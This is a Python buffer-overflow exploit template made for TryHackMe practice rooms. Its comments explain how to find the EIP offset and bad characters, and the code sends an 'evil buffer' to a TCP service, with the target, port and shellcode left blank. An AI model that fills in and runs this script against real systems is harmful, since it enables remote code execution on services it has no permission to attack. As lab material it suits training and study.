# Credits: thank you to Tib3rius for the THM room "Buffer Overflow Prep" and TheMayor for the "Gatekeeper" room
# The exploit.py in the first room is the base code of this script

# We start setting the IP of target and the PORT where the application is listening
# Our first task is to identify and control de EIP register, to this we will use the second overflow line and the X variable
# Prepare the application and start to monitore it
# Set the X to 1000, uncomment the second overflow line and run the script

# In the monitoring see the bytes in EIP
# The bytes 0,1,2,3,4,5,6,7,8,9 that we are sending in the overflow line represent the hex codes 30,31,32,33,34,35,36,37,38,39
# So if the EIP is 35353535 the application stopped in the "5" byte block. 
# So you set OFFSET = 5000, this will launch 5000 "Z" because of the first overflow line
# Now change the X to 100, since we know the interval off the EIP (that is between 5000 and 6000), we will find the hundred part
# Restart the application and run the script

# Do the same thing again, always updating the OFFSET and the X, until the EIP = 42424242
# After that you can start the search for badchars and continue the bufferoverflow exploitation

# if you don't know how to do it i recommend the THM rooms previously cited

# To find the bad chars you can copy the line below inside the payload variable, without the "#" 
# \x01\x02\x03\x04\x05\x06\x07\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

import socket

ip = ""
port = 0
x = 1000

prefix = "BUFFEROVERFLOW "
offset = 0
overflow = "Z" * offset
#overflow=overflow + "0"*x + "1"*x + "2"*x + "3"*x + "4"*x + "5"*x + "6"*x + "7"*x + "8"*x + "9"*x
retn="BBBB" 
padding = ""
payload = "" 
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")